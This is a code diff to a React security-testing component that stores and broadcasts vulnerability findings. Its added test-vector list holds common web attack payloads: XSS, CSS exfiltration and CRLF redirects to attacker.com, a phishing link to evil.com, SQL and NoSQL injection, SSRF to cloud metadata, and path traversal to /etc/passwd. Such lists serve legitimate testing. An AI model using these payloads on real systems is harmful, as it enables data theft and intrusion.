@@ -1,6 +1,8 @@
-import React, { useState } from 'react';
-import { MessageSquare, ShieldAlert, Code, AlertCircle, Loader2, Send, Download } from 'lucide-react';
+import React, { useState, useEffect } from 'react';
+import { MessageSquare, ShieldAlert, Code, AlertCircle, Loader2, Send, Download, History, Zap } from 'lucide-react';
 import { analyzeVulnerability } from '../lib/gemini';
+import { db, auth, useWebSocket, handleFirestoreError, OperationType } from '../lib/firebase';
+import { collection, addDoc, query, orderBy, limit, onSnapshot, serverTimestamp, where } from 'firebase/firestore';
 
 const TEST_VECTORS = [
   { name: 'Basic XSS', payload: '<script>alert(1)</script>', type: 'XSS' },
@@ -9,18 +11,92 @@ const TEST_VECTORS = [
   { name: 'Iframe Injection', payload: '<iframe src="javascript:alert(1)"></iframe>', type: 'XSS' },
   { name: 'Event Handler XSS', payload: '<img src=x onerror=alert(1)>', type: 'XSS' },
   { name: 'CSS Exfiltration', payload: 'input[value^="a"] { background: url("https://attacker.com/a") }', type: 'CSS' },
+  { name: 'DOM XSS (Location)', payload: 'javascript:alert(document.domain)', type: 'DOM XSS' },
+  { name: 'Template Injection', payload: '{{7*7}}', type: 'SSTI' },
+  { name: 'Markdown XSS', payload: '[click me](javascript:alert(1))', type: 'XSS' },
+  { name: 'CRLF Injection', payload: 'Set-Cookie: session=attacker_id\r\nLocation: http://attacker.com', type: 'CRLF' },
+  { name: 'HTML Injection', payload: '<h1>Hacked</h1><p>Your session has expired. Please <a href="http://evil.com">login again</a>.</p>', type: 'HTML' },
+  { name: 'JS Context Escape', payload: '"); alert(1); //', type: 'XSS' },
+  { name: 'Prototype Pollution', payload: '{"__proto__": {"admin": true}}', type: 'POLLUTION' },
+  { name: 'Blind SQLi', payload: "' OR 1=1--", type: 'SQLi' },
+  { name: 'NoSQL Operator', payload: '{"$gt": ""}', type: 'NoSQLi' },
+  { name: 'SSRF Cloud', payload: 'http://169.254.169.254/latest/meta-data/', type: 'SSRF' },
+  { name: 'Open Redirect', payload: '//google.com/%2f..', type: 'REDIRECT' },
+  { name: 'Path Traversal', payload: '../../../../etc/passwd', type: 'LFI' },
 ];
 
 export function SecurityModule() {
   const [loading, setLoading] = useState(false);
   const [analysis, setAnalysis] = useState<any>(null);
   const [customPayload, setCustomPayload] = useState('');
+  const [history, setHistory] = useState<any[]>([]);
+  const { sendMessage, lastMessage } = useWebSocket();
+
+  // Load history from Firestore
+  useEffect(() => {
+    if (!auth.currentUser) return;
+
+    const q = query(
+      collection(db, 'security_findings'),
+      where('uid', '==', auth.currentUser.uid),
+      orderBy('timestamp', 'desc'),
+      limit(10)
+    );
+
+    const unsubscribe = onSnapshot(q, (snapshot) => {
+      const docs = snapshot.docs.map(doc => ({ id: doc.id, ...doc.data() }));
+      setHistory(docs);
+    }, (error) => {
+      handleFirestoreError(error, OperationType.LIST, 'security_findings');
+    });
+
+    return () => unsubscribe();
+  }, [auth.currentUser]);
+
+  // Handle real-time updates from other clients
+  useEffect(() => {
+    if (lastMessage?.type === 'NEW_SECURITY_FINDING') {
+      console.log('Real-time security finding received:', lastMessage.data);
+      // Optionally show a toast or update local state
+    }
+  }, [lastMessage]);
 
   const runAnalysis = async (payload: string) => {
     setLoading(true);
-    const results = await analyzeVulnerability(payload, 'Chat Box Input');
-    setAnalysis({ ...results, raw_payload: payload });
-    setLoading(false);
+    try {
+      const results = await analyzeVulnerability(payload, 'Chat Box Input');
+      const findingData = {
+        ...results,
+        raw_payload: payload,
+        timestamp: new Date().toISOString(),
+        uid: auth.currentUser?.uid || 'anonymous'
+      };
+
+      setAnalysis(findingData);
+
+      // Persist to Firestore
+      if (auth.currentUser) {
+        await addDoc(collection(db, 'security_findings'), {
+          ...findingData,
+          timestamp: serverTimestamp()
+        });
+      }
+
+      // Broadcast via WebSocket
+      sendMessage({
+        type: 'NEW_SECURITY_FINDING',
+        data: {
+          type: results.vulnerability_type,
+          severity: results.severity,
+          timestamp: new Date().toISOString()
+        }
+      });
+
+    } catch (error) {
+      console.error('Analysis failed:', error);
+    } finally {
+      setLoading(false);
+    }
   };
 
   const handleExport = () => {
@@ -69,14 +145,14 @@ export function SecurityModule() {
         </div>
       </div>
 
-      <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
+      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
         {/* Test Vectors */}
-        <div className="border border-ink p-6 bg-white shadow-sm">
+        <div className="border border-ink p-6 bg-white shadow-sm lg:col-span-1">
           <div className="flex items-center gap-2 mb-4">
             <Code className="w-5 h-5" />
-            <h3 className="col-header">Standard Test Vectors</h3>
+            <h3 className="col-header">Advanced Test Vectors</h3>
           </div>
-          <div className="space-y-2">
+          <div className="space-y-2 max-h-[400px] overflow-y-auto pr-2 custom-scrollbar">
             {TEST_VECTORS.map((vector, i) => (
               <div 
                 key={i} 
@@ -113,7 +189,7 @@ export function SecurityModule() {
         </div>
 
         {/* Analysis Results */}
-        <div className="border border-ink p-6 bg-white shadow-sm">
+        <div className="border border-ink p-6 bg-white shadow-sm lg:col-span-1">
           <div className="flex items-center gap-2 mb-4">
             <AlertCircle className="w-5 h-5" />
             <h3 className="col-header">Vulnerability Analysis</h3>
@@ -161,6 +237,40 @@ export function SecurityModule() {
               <p className="font-mono text-sm uppercase tracking-widest">Select a vector to analyze</p>
             </div>
           )}
+        </div>
+
+        {/* Audit History */}
+        <div className="border border-ink p-6 bg-white shadow-sm lg:col-span-1">
+          <div className="flex items-center gap-2 mb-4">
+            <History className="w-5 h-5" />
+            <h3 className="col-header">Audit History</h3>
+          </div>
+          <div className="space-y-3">
+            {history.map((item, i) => (
+              <div key={item.id} className="p-3 border border-bg bg-bg/10 hover:bg-bg/20 cursor-pointer transition-colors" onClick={() => setAnalysis(item)}>
+                <div className="flex justify-between items-start mb-1">
+                  <span className={`text-[8px] px-1.5 py-0.5 rounded uppercase font-bold ${
+                    item.severity === 'Critical' ? 'bg-red-600 text-white' :
+                    item.severity === 'High' ? 'bg-orange-600 text-white' :
+                    'bg-yellow-600 text-white'
+                  }`}>
+                    {item.severity}
+                  </span>
+                  <span className="text-[8px] opacity-50 font-mono">
+                    {item.timestamp?.toDate ? item.timestamp.toDate().toLocaleTimeString() : 'RECENT'}
+                  </span>
+                </div>
+                <p className="text-xs font-bold truncate">{item.vulnerability_type}</p>
+                <p className="text-[10px] opacity-60 truncate font-mono">{item.raw_payload}</p>
+              </div>
+            ))}
+            {history.length === 0 && (
+              <div className="flex flex-col items-center justify-center py-10 opacity-20">
+                <Zap className="w-8 h-8 mb-2" />
+                <p className="text-[10px] uppercase tracking-widest">No history found</p>
+              </div>
+            )}
+          </div>
         </div>
       </div>
     </div>
